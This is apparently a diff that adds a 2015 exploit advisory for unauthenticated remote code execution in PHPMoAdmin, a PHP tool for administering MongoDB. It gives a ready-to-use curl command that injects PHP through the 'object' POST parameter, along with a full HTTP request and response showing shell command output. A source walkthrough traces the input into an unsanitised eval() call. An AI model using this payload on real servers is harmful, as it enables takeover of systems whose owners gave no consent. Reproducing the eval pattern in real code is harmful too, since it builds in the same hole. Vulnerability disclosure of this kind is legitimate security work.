@@ -1,0 +1,87 @@
+######################################################################
+#  _     ___  _   _  ____  ____    _  _____
+#  | |   / _ \| \ | |/ ___|/ ___|  / \|_   _|
+#  | |  | | | |  \| | |  _| |     / _ \ | |
+#  | |__| |_| | |\  | |_| | |___ / ___ \| |
+#  |_____\___/|_| \_|\____|\____/_/   \_\_|
+#
+# PHPMoAdmin Unauthorized Remote Code Execution (0-Day)
+# Website : http://www.phpmoadmin.com/
+# Exploit Author : @u0x (Pichaya Morimoto), Xelenonz, pe3z, Pistachio
+# Release dates : March 3, 2015
+#
+# Special Thanks to 2600 Thailand group
+# https://www.facebook.com/groups/2600Thailand/ , http://2600.in.th/
+#
+########################################################################
+
+[+] Description
+============================================================
+PHPMoAdmin is a MongoDB administration tool for PHP built on a
+stripped-down version of the Vork high-performance framework.
+
+[+] Exploit
+============================================================
+Someone was trying to sale this shit for 3000usd lolz
+
+$ curl "http://path.to/moadmin.php" -d "object=1;system('id');exit"
+
+[+] Proof-of-Concept
+============================================================
+PoC Environment: Ubuntu 14.04, PHP 5.5.9, Apache 2.4.7
+
+POST /moadmin/moadmin.php HTTP/1.1
+Host: 192.168.33.10
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0)
+Gecko/20100101 Firefox/36.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+object=1;system('id;ls -lha');exit
+
+HTTP/1.1 200 OK
+Date: Tue, 03 Mar 2015 16:57:40 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Set-Cookie: PHPSESSID=m0ap55aonsj5ueph7hgku0elb1; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 223
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+total 116K
+drwxr-xr-x 1 longcat longcat  102 Mar  3 16:55 .
+drwxr-xr-x 6 root    root    4.0K Mar  3 16:17 ..
+-rw-rw-r-- 1 longcat longcat 112K Mar  3 16:55 moadmin.php
+
+[+] Vulnerability Analysis
+============================================================
+Filename: moadmin.php
+1. create new moadminComponent object
+1977: $mo = new moadminComponent;
+
+2. if the http-post parameter 'object' is set
+738: class moadminComponent {
+...
+762: public function __construct() {
+...
+786: if (isset($_POST['object'])) {
+787:    if (self::$model->saveObject($_GET['collection'],
+$_POST['object'])) {
+...
+
+3. evaluate the value of 'object' as PHP code
+692: public function saveObject($collection, $obj) {
+693:    eval('$obj=' . $obj . ';'); //cast from string to array
